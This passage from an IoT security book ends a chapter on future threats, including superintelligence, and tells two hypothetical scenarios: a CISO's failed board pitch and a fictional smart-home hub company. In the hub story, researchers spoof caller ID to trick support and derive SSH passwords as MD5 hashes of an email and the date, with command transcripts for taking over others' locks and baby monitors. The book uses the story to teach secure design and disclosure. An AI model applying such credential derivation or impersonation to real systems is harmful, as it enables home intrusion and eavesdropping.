“Let an ultraintelligent machine be defined as a machine that can far surpass all the
intellectual activities of any man however clever. Since the design of machines is one of
these intellectual activities, an ultraintelligent machine could design even better ma‐
chines; there would then unquestionably be an intelligence explosion, and the intelligence
of man would be left far behind. Thus the first ultraintelligent machine is the last invention
that man need ever make”.
Nick Bostrom, author and professor at Oxford, defines superintelligence as “an intellect
that is much smarter than the best human brains in practically every field, including
scientific creativity, general wisdom and social skills”. Bostrom and other leading sci‐
entists are worried that machines capable of superintelligence are going to be difficult
to control and that they may have the ability to take over the world and eliminate hu‐
mankind.
Well known intellectuals and leaders such as Bill Gates are worried about super intel‐
ligence:
“I am in the camp that is concerned about super intelligence. First the machines will do
a lot of jobs for us and not be super intelligent. That should be positive if we manage it
well. A few decades after that though the intelligence is strong enough to be a concern. I
284 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

agree with Elon Musk and some others on this and don’t understand why some people
are not concerned”.
The Future of Life institute is a volunteer-run research and outreach organization that
has been set up to measure and mitigate existential risks facing humanity, including
superintelligence. The institute is currently focusing on potential risks from the devel‐
opment of human-level artificial intelligence. The founders and advisory board of the
Future of Life institute consists of indviduals such as Stephen Hawking, Alan Alda, and
Elon Musk, to name a few. This demonstrates that some of the leading minds across
various industries are genuinely worried of the perils of supertintelligence and that they
want to contribute their time and effort to make sure we think through risks appropri‐
ately.
As we get closer to designing machines that are capable of superintelligence, it is likely
that professionals with cybersecurity experience are going to be called upon to assist in
designing algorithms that can help curtail potentially intelligent machine by running
simulations of artificial intelligence in a controlled environment (i.e. a “sandbox”) that
protects the safety of human beings.
Computing devices capable of greater levels of intelligence will have access to IoT devices
that they can control. The intelligent code itself will be a “thing” on the network it is
executed on and may have the intelligence to branch out onto other networks. The
unique situation with the risk of superintelligence is that catastrophe is likely to be
caused in the lab where scientists are not able to control a superintelligent machine in
ways they originally thought they could. It is easy to see how the knowledge of how to
create and unleash superintelligent computing can be attractive to terrorists who want
to unleash destruction and havoc.
The threat of superintelligence is easily on top of mind of scientists and researchers in
the area of computer science, and is quite likely the greatest human-made existential
threat to humankind.
Conclusion
From thingbots to drones to device backdoors, the attack surface presented by inter‐
connected devices is going to be attractive to threat agents and provide them with un‐
paralleled access to our privacy and physical safety.
Vulnerabilities such as Heartbleed that suddenly affect millions of computing devices
have already known to affect IoT devices such as the Nest thermostat. It is quite likely
that many other IoT devices in the market are vulnerable to Heartbleed and will continue
to be vulnerable due to lack of a security patch, either because the vendor has not released
one or because the patch was not applied or failed. There are also devices that do not
incorporate a mechanism for patches to be applied at all, and these devices are going to
contribute to insecurity for years to come until they are decommissioned.
Conclusion 
| 
285

Information collected about citizens in terms of advertisement tracking as well as the
compromise of health data has been an ongoing issue of concern. With IoT devices in
the mix, we are bound to have cases where data collected from IoT sensors within our
homes will be leveraged for marketing, contributing to intrusive privacy violations.
Health information, traditionally trapped within instruments in hospitals, will be col‐
lected by consumer devices that may be prone to tampering. This health information
will be utilized for research and stored in multiple locations in the cloud, thus increasing
the probability of exposure.
Areas around the world are starting to leverage the concept of the smart city to serve
their citizens efficiently. The combination of industrial- and consumer-grade IoT de‐
vices that empower these cities will introduce risk and open citizens up to privacy and
security attacks that were previously limited to online spaces.
In terms of travelling to Mars and making our machines more intelligent, humankind
faces great potential for triumph as well as great peril from threat agents—including
superintelligent machines—who could destroy our population and curtail our ability
to colonize other planets. As we make progress in the field of space travel and machine
intelligence, we are going have to discuss and put a lot of thought into how to secure
these platforms early on because vulnerabilities in these efforts can lead to the loss of
human lives.
The ultimate goal of the cybersecurity profession is to enable connected technology as
securely and swiftly as possible, and this enablement must begin with informed pre‐
dictions of upcoming scenarios of attacks such as the ones discussed in this chapter.
286 
| 
Chapter 8: Securely Enabling our Future: A Conversation on Upcoming Attack Vectors

CHAPTER 9
Two Scenarios: Intentions and Outcomes
We now have a solid foundation for understanding the security issues pertaining to
devices in the market today, as well as the impact that security vulnerabilities may have
on IoT device manufacturers and the lives of people using the devices. We have also
studied the process of coming up with an idea for an IoT product and building in the
right security controls eary on, starting from the prototyping stage. At this point, we
have a good sense of how to measure risk by marrying gaps in security controls with
our understanding of how agents are likely to take advantage of them.
In addition to understanding security controls, it is important to realize that security
incidents, when viewed holistically, are greatly influenced by the individuals who are
involved and how those individuals choose to react to the situations at hand.
In this chapter, we will take a look at two different scenarios to gain an appreciation of
how people can influence security incidents. In the first scenario, we will examine how
an executive at a large corporation attempts to leverage the “buzz” surrounding the topic
of IoT with the hope that it will impress the board of directors. In the second scenario,
we will look at how an up and coming IoT service provider chooses to engage and
respond to researchers and journalists with the intention of preserving the integrity of
their business. The goal of this chapter is to illustrate that, ultimately, the consequences
of security related scenarios are heavily influenced by the intentions and actions of the
people involved.
The Cost of a Free Beverage
The cybersecurity field is riddled with vendors who want to sell software tools that are
often ineffective in reducing tangible risk, thereby giving organizations a false sense of
security. More specifically, tools that attempt to assess and secure emerging technologies
and new attack vectors often take time to improve on accuracy by consistently incor‐
porating feedback and new research.
287

On the other hand, the marketability and the importance of the Chief Information
Security Officer (CISO) role at corporations around the world is at an all-time high.
Companies are worried about a spectrum of threat agents who may be able to exploit
vulnerabilities to cause them financial harm and severe degradation of their brand.
Executives who are able to fill the role of the CISO to guard large and complex infra‐
structure are in high demand, with salaries exceeding $1 million.
The situation of high demand and low availability of seasoned executives is leaving
corporations at risk of investing money and effort on security tools that may not be
effective. In this hypothetical scenario, we will take a look at how the emergence of IoT,
along with the lack of understanding of a comprehensive corporate security strategy,
can leave an organization at risk.
There’s a Party at Ruby Skye
The RSA conference is held in San Francisco every year and it is the biggest cybersecurity
conference in the world. Besides the keynote lectures and speaking sessions, the con‐
ference is a great opportunity to network and socialize with professionals who come to
San Francisco for the conference.
John Smith, newly appointed Vice President and CISO at Acme Inc., had been partic‐
ularly looking forward to the conference. He had just started working at Acme Inc.,
where the board of directors had already approved hiring 30 new full-time employees
to work under him. John was excited about his new role and wanted to share his ex‐
citement with his friends attending RSA.
Sam Cronin, Executive Director and head of sales at Plunk, was also excited about RSA.
He had managed to successfully put a business case through to lease the entire dance
floor at Ruby Skye, a popular night club in San Francisco. During the RSA conference,
vendors are known to rent out popular restaurants and bars to host free parties for
conference attendees with the hope that some of the people attending will be impressed
enough by these parties to convert to clients.
Plunk is a popular tool used to capture and correlate large amounts of log data that can
be analyzed to alert on anomalies to help identify suspicious events that may be related
to an attack. Smith RSVP’d to the Plunk party invitation. He was familiar with the
product and knew Ruby Skye would be a good time.
Smith showed up to Ruby Skye and flashed his RSA attendee badge at the entrance
counter. The Plunk representative immediately noticed the Vice President title on the
badge and whisked him to the VIP section, which included top-shelf beverages as well
as access to a larger private area reserved for potential clients in executive roles.
Cronin introduced himself to Smith as the head of sales, and they struck up a conver‐
sation on the security of IoT devices. Smith also talked about his new job and how he
was excited to have the chance to present to the board at Acme Inc. to ask for a higher
288 
| 
Chapter 9: Two Scenarios: Intentions and Outcomes

operating budget to run his team, hire additional personnel, and buy more security
products. Upon hearing this, Cronin offered free consulting advice to help Smith pre‐
pare for the board meeting. Smith, in return, remarked that he would buy licenses for
the Plunk security tool if the board ended up accepting his proposal. They shook hands
and decided to catch up in a few days to further the discussion.
Leveraging the “Buzz Word”
A week after the RSA conference, Smith and Cronin connected by phone. Smith’s in‐
tention was to “wow” the board and have them approve his plan to hire 55 additional
full-time employees and to fund an operating budget of $100 million in capital and
operating expenses for the next three years.
Cronin had recently been tasked with selling the Plunk tool with an additional feature
that collects log data from IoT products in the enterprise so companies can track their
inventory of devices that have been deployed. This is useful for security since devices
such as laptops, mobile phones, and IoT products present a huge security risk if they
are unaccounted for. This is because it is impossible to measure or reduce security risk
posed by devices if the organization has no control over them.
Smith inquired if Cronin had any particular ideas on what topics the board may be
interested in. Cronin suggested that the board presentation to be focused on the latest
“buzz” in the industry about the upcoming age of IoT devices and the security risks they
are bound to introduce. In the previous year, the hot topic at the RSA conference in‐
cluded the use of machine learning and big data to correlate security log data to detect
attacks. This year, the latest topic of discussion at the conference was the security im‐
plications of IoT products. Smith agreed to focus in on the topic of IoT. He felt the board
members would find the topic interesting and it would make his knowledge appear
cutting edge and impress the executives.
The Board Meeting
Smith’s presentation was at 10:40am and he had exactly 10 minutes to present his case.
He had prepared a slide deck for the meeting but he was told that the board of directors
at Acme Inc. did not have time for a PowerPoint presentation. He had to make his case
quickly and crisply.
Smith: Thank you for taking the time to have me present to you on the topic of security.
As a newly appointed Chief Information Security Officer, I am committed to…
Board Director #1: I have to interrupt. What exactly is the agenda of the discussion you
are proposing?
Smith: I’m here to talk about the most important security risks that we need to be prepared
to combat.
The Cost of a Free Beverage 
| 
289

Board Director #1: Okay, let’s jump right in and skip the introduction. We know you are
the CISO. We appointed you. We know what your job description is. Go ahead.
Smith: Okay. I’m sure the board is aware of IoT devices in the marketplace and the ma‐
jority of these devices are being found to have security risks. We ought to carefully think
of partnering with a leading security tool company called Plunk so that we can…
Board Director #2: Hold on a second. We are a health insurance company. Exactly what
type of IoT devices do we have in our offices that are in scope? Are you suggesting the
risk of IoT devices to our business today is more important than spending our money in
shoring up our compliance with health regulations? Or are you talking about risk from
IoT devices that you personally predict may impose risk on us in the future?
Smith: My discussion is really about the future. I’m not sure what IoT devices we may
need to be worried about today but I was at the RSA conference and all the keynote
speakers mentioned the security implications of IoT and I wanted…
Board Director #2: Come back to us when you are able to map the strategy of our business
to technology and can talk to us about tangible issues that are based on factual under‐
standing of our technology landscape. That will be all Mr. Smith. Let’s have the next
presenter come up.
Smith was escorted out of the conference room. He had predicted the board of directors
would be welcoming of his knowledge on cutting edge security topics, yet his presen‐
tation lasted about 1 minute an 15 seconds. He was stunned.
Human resources called Smith the next day and asked for his resignation effective im‐
mediately. He would be given the 6-month severance pay specified in his employment
contract.
Looking back at this scenario, there are multiple things that went wrong. Sam Cronin’s
role as the sales executive at a security-tool company made him a biased candidate.
Ultimately, Cronin was focused on selling licenses to his updated product, which as not
in alignment with what was best for the board of directors at Acme Inc.
Smith should have consulted his peers and other unbiased individuals he had called
upon for mentorship in the past. It is clear that Smith did not have experience with
presenting to the board. Boards of directors want to know the problem statement at
hand and how it connects to the business of what the company does. Instead of focusing
on just IoT, Smith should have presented a prioritized list of security issues that could
interrupt the business of Acme Inc. in terms of unauthorized access or the loss of con‐
fidentiality of their intellectual property. This list could potentially include IoT along
with a proposed roadmap of greater adoption of IoT devices. Because Smith focused on
IoT only, it was immediately apparent to the board that he had not thought through the
entire risk landscape.
The importance of IoT and how it is bound to enable our future lives at home and work
is clear. We are going to have frequent conversations about the security of these devices
as they enter our world. As is often the case with new forms of technology, individuals
and media personnel want to leverage the buzz in the industry to attract attention. In
290 
| 
Chapter 9: Two Scenarios: Intentions and Outcomes

many cases, this is well and good as it informs the public and promotes fruitful con‐
versation. However, in this case, Smith not only wasted the time of the board of directors,
but his inability to present a well thought out and holistic security strategy left Acme
Inc. with no clear path to shoring up their security controls until they are able to find
and hire another CISO to replace him.
A Case of Anger, Denial, and Self Destruction
Consumers are starting to rely upon IoT devices in their homes and offices that are
manufactured by a variety of companies such as Philips, Belkin, and Samsung. Organ‐
izations like Apple, Microsoft, the SmartThings suite of products, and IFTTT are vying
to create unified platforms that allow different devices to work together and provide a
seamless user experiences.
IoT products in the marketplace today contain substantial security design flaws, as
showcased in the other chapters in this book. These products are already being used by
consumers at home. This situation creates the possibility of a a single point of failure
leading to the compromise of families’ IoT ecosystems. Traditionally, software vendors
have been able to issue critical patches to quickly remediate high-risk vulnerabilities.
The negative implications to end users have typically been limited to the nuisance of
having to reboot their computers to get rid of nagging software update popups.
Platforms that bring together IoT devices manufactured by different vendors speaking
different protocols have a profound responsibility to enable patching of security issues
as well as protecting their own infrastructure from being compromised or abused by
internal employees. Unlike operating systems and apps, it may not be possible or even
feasible for IoT platform providers to quickly implement a security fix to a known vul‐
nerability without disrupting services that the users rely on for their daily activities. In
this hypothetical scenario, we will go through exactly such a situation so that we’re aware
of the possibilities of disruption that may result from lapses in security.
The Benefit of LifeThings
One great benefit of working at LifeThings was the great work culture. Even though the
startup grew from 20 employees to 1,000 in a span of 9 months, the CEO upheld the
promise of maintaining a flat organization where an employee’s value was measured
based on their contributions and not their title.
LifeThings’ business strategy was to unify the IoT devices in homes so that consumers
didn’t have to worry about downloading a separate app for each device they bought.
Their product was a hub that would plug into the user’s home WiFi network and detect
IoT devices on the network. From wireless doorlocks to cars to lighting to baby moni‐
tors, LifeThings struck up partnership with big players like SmartThings, Philips, Fo‐
scam, and many other device manufacturers to integrate into the LifeThings hub.
A Case of Anger, Denial, and Self Destruction 
| 
291

Piggybacking on real-estate in San Francisco and Seattle, LifeThings leveraged con‐
struction of new high rise condominiums by offering consumers their product for free
for life. They struck deals with builders to install their hub in new condos so customers
could use them as soon as they moved in. The presence of the LifeThings hub caused
condominium owners to buy and install wireless lighting, connected door locks, and
video monitors to take advantage of the free service offered by LifeThings. People loved
the seamless interoperability offered by LifeThings. They could create recipes to control
their lighting, share electronic keys with friends to allow them to enter their homes, and
so much more. Based on word of mouth and positive reviews, LifeThings quickly be‐
come a household name and their business skyrocketed.
Simin Powell operated the customer support team for LifeThings. According to a recent
survey, satisfaction with LifeThings’ customer support was at 99.8%, rivaling most other
technology companies. She publically went on record promising that every customer-
support issue would be solved within 5 minutes of the customer initiating the support
call. For the most part, Simin was able to deliver on her promise. Parents would call
LifeThings customer support to let their children into their homes upon returning from
school, or to check the status of their main door if they couldn’t recall locking it. A lot
of these requests could be handled by the LifeThings app, but the company always
complied with phone requests because they wanted to provide a concierge service to
best serve their customers when they had issues.
Social Engineering Customer Support by Spoofing SMS
A couple of security researchers who were LifeThings users noticed that customer sup‐
port would automatically greet them by name. While most customers felt this was a
delightful service experience, the researchers quickly realized that LifeThings trusted
the incoming phone number by correlating the caller ID with customer records to
identify the user. They tried calling customer support to report the issue but the service
agents were not able to comprehend and insisted that their services were “secure from
hackers”. Without any avenue to successfully report the issue, the researchers released
their findings by blogging about it and demonstrating how easy it is to spoof caller ID
information using a commercial service such as SpoofCard (Figure 9-1).
292 
| 
Chapter 9: Two Scenarios: Intentions and Outcomes

Figure 9-1. SpoofCard allows anyone to easily fake the incoming Caller ID
The security researchers even released audio files of them calling LifeThings customer
service with someone else’s Caller ID using SpoofCard and instructing customer service
to help them unlock the main door. Simin Powell released this response to the media:
The security and privacy of our customers is of utmost importance to us. We feel the
individuals who have released information on how to social-engineer our customer ser‐
vice team demonstrated unprofessionalism by exposing this information and that hack‐
ing services such as SpoofCard enable malicious activities such as these and should be
banned. That said, we are continuously researching ways to serve our customers using
the most efficient and secure methods.
The problem with Powell’s response is that it is solely based on an emotional response
towards the researchers and offers no tangible solution to address the risk posed to the
customers. This is common in situations where companies do not fully appreciate the
risk to their business and their customers. It is also common in cases where organiza‐
tions are under pressure to provide experiences to customers but they haven’t had the
time to think through the security controls. Moreover, the fact that the researchers
attempted to report the issue was not acknowledged in Powell’s statement.
The (In)Secure Token
Since the service agents at LifeThings had to do their best to solve customers’ problems
within 5 minutes, they spent the first 2 minutes evaluating whether it was a non-technical
issue or a frequently asked question they could answer. If not, the agents could remotely
A Case of Anger, Denial, and Self Destruction 
| 
293

log into the LifeThings hub at the customer’s location to service the request. To do this,
they’d type in the following command on to their computer terminals:
$ create-secure-token customer@email.com
Secure-token: a7144596f20fe4daf3a3c75f7011c4c5
Assuming the customer’s email address is customer@email.com, the Secure-token
value was used to access the customer’s hub. The service agent would have to ssh into
a server located at secure.lifethings.com using the Secure-token as a password:
$ ssh -l customer@email.com secure.lifethings.com
Password: a7144596f20fe4daf3a3c75f7011c4c5
The agent would then query the hub for attached devices using the hub command:
$ hub -l
1. [Thermostat] [Status: 69F]
2. [Lock: Main door] [Status: Locked]
3. [Lock: Garage door] [Status: Locked]
4. [Light switch: Living room lamp] [Status: Off]
5. [Baby monitor: Bedroom 2] [Status: Inactive]
Here is an example of how the temperature of the customer’s thermostat could be
changed:
$ hub "Thermostat" -s "80"
[Thermostat] [Status: 80F]
And here is how the customer’s main door could be unlocked:
$ hub "Lock: Main door" -s "Unlocked"
[Lock: Main door] [Status: Unlocked]
It was also possible to listen in on 2 minutes of the audio captured by the baby monitor
by accessing audio1.mp3 after running the following command:
$ hub "Baby monitor: Bedroom 2" -s "2m" -o audio1.mp3
[Baby monitor: Bedroom 2] [Status: Capturing audio to audio1.mp3 for 120s.
Press ^C to abort]
The hub tool located on secure.lifethings.com allowed the service agents to easily
check and change the status of devices connected to the LifeThings hub. This made it
easy for them to quickly assist customers who were having trouble with certain devices,
and even cases where the customers were locked out of their homes.
Total Ownage
Exactly a year after exposing the SMS security issue, the researchers were scheduled to
present at a security conference. They wondered if they could analyze the system further.
After unscrewing the top cover of their LifeThings hub, they located a Micro SD card
and found the file /etc/config with the following contents:
294 
| 
Chapter 9: Two Scenarios: Intentions and Outcomes

SSH_REMOTE=secure.lifethings.com
USER=researchers@email.com
MD5=93a4c0c0da435f4434f828c95cf70d6a
They were able to quickly find out that secure.lifethings.com was running an ssh
service they could log into. They assumed the username was researchers@email.com
since it was assigned to the string USER in the /etc/config file and it was their own
email address that they had used to sign up for their LifeThings account. but it did not
occur to them that the MD5 hash value was actually the password. After tinkering around
for the evening, they decided to call it a night and investigate the next day.
The following morning, they pulled out the SD card again and looked at the /etc/
config file again:
SSH_REMOTE=secure.lifethings.com
USER=researchers@email.com
MD5=a0536156e0267d5ed71a59cca90f2692
The value of MD5 had changed. They put the SD card back into the hub for a few hours
and removed it again the same day to find that the value of MD5 this time was still
a0536156e0267d5ed71a59cca90f2692. This meant that the value was changing daily
and is likely to be associated with the date. The date was June 10, 2015 so they tried
various combinations of strings:
$ md5 -s "June 10, 2015"
MD5 ("June 10, 2015") = 21c0f5e21aea63e9c1e3055a3eda6cb9
$ md5 -s "06102015"
MD5 ("06102015") = 14e2234a4c2d9ba4490b548972d6b794
$ md5 -s "06-10-2015"
MD5 ("06-10-2015") = 579949533abab20c4b07f5ed7d56b70d
None of the hash values matched up. Then it dawned upon them that the value may be
a concatenation of the USER value and the date. After a few attempts, they cracked it!:
$ md5 -s 'researchers@email.com06102015'
MD5 ("researchers@email.com06102015") = a0536156e0267d5ed71a59cca90f2692
This made complete sense because they got the previous MD5 value when they put in
the previous day’s date:
$ md5 -s 'researchers@email.com06092015'
MD5 ("researchers@email.com06092015") = 93a4c0c0da435f4434f828c95cf70d6a
Bingo! The researchers then realized the most elementary issue here they had missed
previously, the MD5 value was the password to log into the ssh server:
$ ssh -l researchers@email.com secure.lifethings.com
Password: a0536156e0267d5ed71a59cca90f2692
A Case of Anger, Denial, and Self Destruction 
| 
295

After logging in and finding the hub command, they figured out they had access to their
own hub. But they also knew of a friend who had the LifeThings hub. Based on today’s
date, they calculated their friend’s password:
$ md5 -s 'friend@email.com06102015'
MD5 ("friend@email.com06102015") = b6ebb2b704bc66c2d50b5d5ed2425e5c
They were then able to log in as their friend and control his devices remotely just like
customer service agents could. Having tried to report the SMS issue previously and
being blamed by LifeThings for being “unprofessional”, the researchers exposed the issue
at a security conference a year later, showing how attackers could remotely gain access
to all devices connected to LifeThings as long as they knew the target’s email address.
The Demise of LifeThings
A week after the researchers presented their findings, investigative journalist Stan
Goodin wrote an article correlating the researchers’ findings to multiple cases where
the insecure design of the LifeThings infrastructure had recently been exploited:
1. Statistics collected from police department reports showed an unusually high num‐
ber of burglaries in the high-rise condominiums powered by LifeThings.
2. Private audio recordings of high-profile political candidates discussing secret cam‐
paign details with their spouses at home had been leaked on the Internet. All four
of the candidates targeted in this leak were known to live in houses served by Life‐
Things.
Stan Goodin’s article was picked up and syndicated across various media groups around
the world. Simin Powell issued this response on behalf of LifeThings:
The leadership at LifeThings take the privacy and security of our customers very seriously.
The recent article by Mr. Goodin is unfounded since it is based on unreliable statistics
and hearsay. Customers should contact LifeThings customer support directly to report
any suspicious activity.
Yet again, the statement released by LifeThings didn’t address any efforts made by the
company to actually investigate the matter. By this time, there was still no advertised
method to contact LifeThings to report a security issue.
A few weeks after Goodin’s article, the researchers who exposed the secure token issue
wrote a blog post stating that they had evidence to prove that the United States and the
Chinese government of logging into the secure.lifethings.com server. They stopped
short of providing any tangible evidence or any additional information about what
exactly they had found the two governments to be using the server for.
Two days later, a hacktivist group with the twitter handle @against_world_gov tweeted:
“Don’t mess with us, LifeThings. We know you are working with the NSA to violate our
people’s privacy. This Denial of Service is on us”. Simultaneously, the hacktivist group
296 
| 
Chapter 9: Two Scenarios: Intentions and Outcomes

launched a Denial of Service attack on secure.lifethings.com, which prevented all
LifeThings devices from being controllable from the hub. The same day, LifeThings
issued the following statement:
We are investigating an ongoing Denial of Service attack against our networks that has
caused the LifeThings hub to become unresponsive. We are committed to finding the
perpetrators and returning our service to normal.
However, no matter how hard LifeThings worked with their Internet Service Providers
to curtail the attack, the hacktivist group continued to use different armies of botnets
to lunach attacks from various locations. Two days after the previous statement, Life‐
Things issued the following notice:
LifeThings is committed to returning our services to normal. Customers have been
emailed step by step instructions on how to exchange their LifeThings hub with a new
hub (LifeThings2) that is not susceptible to the ongoing issues we are facing. We thank
you for your patience.
This notice from LifeThings illustrates that the company had no mechanism to modify
their server architecture or update the firmware in the installed hubs to get around the
ongoing attack. The only solution was to physically swap the old hub for a new one. At
the time, it wasn’t clear what extra precautions or security architecture were present in
the new hub.
Not many customers took the time and effort to physically mail back the hub. Many
high-profile citizens simply unplugged the hub and terminated their LifeThings service.
The secure.lifethings.com server was eventually taken offline and the venture-
capital firm backing LifeThings refused to provide it with additional funding, causing
the company to file for bankruptcy.
Looking back, it is clear that the engineers who designed the architecture to include the
secure.lifethings.com server did not comprehend security best practices. The orga‐
nization did not have an avenue for security researchers to report issues. Even after
researchers exposed the SMS security issue, LifeThings called the researchers unpro‐
fessional and did not institute a mechanism for additional security issues to be reported.
They even dismissed Stan Goodin’s analysis, demonstrating that they had no under‐
standing of it or regard for their customers’ privacy or security. Their architecture was
not designed in a way that could withstand denial of service attack without issuing every
customer a new physical hub, the cost of which was borne by LifeThings and required
customers to mail back the hub and install the new one.
There are multiple lessons learnt here:
1. IoT device manufacturers and platform service providers have a tremendous re‐
sponsibility to make sure their devices can be patched remotely to withstand and
heal from basic attack vectors.
A Case of Anger, Denial, and Self Destruction 
| 
297

2. Words such as “secure” in design or server names do not indicate that the engineers
have experience in secure design. It is important for the proposed architecture to
be inspected and assessed by an independent, qualified third party.
3. A clearly defined communication process should be defined for researchers who
want to report security issues.
4. Security issues exposed by researchers should be paid attention to and investigated.
5. A single security issue—or in this case, a series of reported issues—when not taken
seriously, can seriously hurt the provider’s business and, ultimately, the protection
promised to the customers.
Every IoT device or platform provider may at some point face a situation where their
architecture is proven insecure in one way or the other. This scenario is a clear illus‐
tration of how the continued lack of due diligence can (and often will) lead to the demise
of customer confidence and the provider’s business.
Conclusion
Based on the two scenarios studied in this chapter, it is evident that situations involving
security are shaped by the intentions of key individuals.
In the first scenario, John Smith intended to impress the board of directors by focusing
on security around IoT. However, his approach was misaligned with the interests of his
employer. Instead of demonstrating a solid understanding of the interests of the business
and the technical risks pertaining to the vision of the company, Smith focused on the
topic of IoT because it was a “buzz” word. Even if Smith’s intention was to leverage the
topic to gain further support from the board and ultimately obtain funding to operate
a better team, he came across as self-serving, focusing on his own interests and career
rather than taking into account what was best for the business. This is a critical scenario
to ponder and learn from given the interest in the topic of IoT in the market today. It is
always good to discuss emerging topics and be prepared for the future, but it is equally
important—if not more important—to stay focused to the business one is trying to
protect, and to be able to put forward a crisp security strategy that aligns with the
organization.
In the second scenario, LifeThings gained quick ground as an IoT platform by making
the right investments in newly constructed high-rises. However, their commitment to
swift customer support was provided at a cost: anyone could use SMS spoofing to im‐
personate customers. SmartThings responses to researchers and journalists showed that
the company was reacting emotionally, most likely because they did not employ talent
who could help them understand the importance of security and the critical processes
that need to be in place to communicate with researchers, journalists, and customers.
The security architecture of the platform was also poorly designed and the company
struggled to address the issues when they were exposed. Due to the lack of understanding
298 
| 
Chapter 9: Two Scenarios: Intentions and Outcomes

and proper decisions on part of the LifeThings leadership, customers suffered a loss of
privacy, including physical theft, ultimately leading to the financial demise of the com‐
pany.
These two scenarios are helpful in understanding that situations surrounding security
are dependent on the intentions of the people involved. It is important for organizations
to make sure they employ the right people who are able to correlate their intentions with
positive outcomes for their organizations, as well as to their shareholders and customers.
This book has covered actual IoT products in the market and the security issues they
face. We have also discussed the details of how to design and prototype new IoT devices
and think through the attacks various kinds of threat agents may be drawn to. We have
predicted future attack vectors that we must be informed of as we design and use IoT
products. Finally, we’ve seen how people themselves are highly influential in outcomes
of security incidents based on their intentions and how they go about dealing with issues
pertaining to security. I sincerely hope that this book has provided you with a solid
foundation for understanding the threat landscape pertaining to the Internet of Things,
and that you are able to use this information to benefit the secure enablement of our
lives so that we can safely enjoy and benefit from technology in the years to come.
Conclusion 
| 
299

